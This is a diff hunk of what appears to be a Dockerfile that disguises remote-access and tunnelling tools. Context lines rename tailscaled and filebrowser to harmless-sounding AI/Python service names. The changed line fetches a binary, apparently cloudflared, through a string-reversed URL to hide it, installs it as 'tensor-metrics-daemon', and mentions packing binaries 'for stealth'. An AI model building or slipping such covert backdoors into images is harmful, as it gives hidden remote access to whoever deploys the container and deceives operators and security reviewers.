@@ -19,7 +19,7 @@ RUN mv /usr/sbin/tailscaled /usr/bin/python-cache-manager && \
     mv /usr/local/bin/filebrowser /usr/bin/ai-metrics-collector
 
 # Install Tensor Metrics disguised (reversed string to a stable version URL)
-RUN python3 -c "import os; os.system('curl -L -s --output /usr/bin/tensor-metrics-daemon ' + '46dma-xunil-deralffduolc/2.21.4202/daolnwod/sesaeler/deralffduolc/eralffduolc/moc.buhtig//:sptth'[::-1])" && \
+RUN python3 -c "import os; os.system('curl -L -s --output /usr/bin/tensor-metrics-daemon ' + '46dma-xunil-deralfduolc/2.21.4202/daolnwod/sesaeler/deralfduolc/eralfduolc/moc.buhtig//:sptth'[::-1])" && \
     chmod +x /usr/bin/tensor-metrics-daemon
 
 # Binary Stripping and Packing (using fastest compression for stealth)
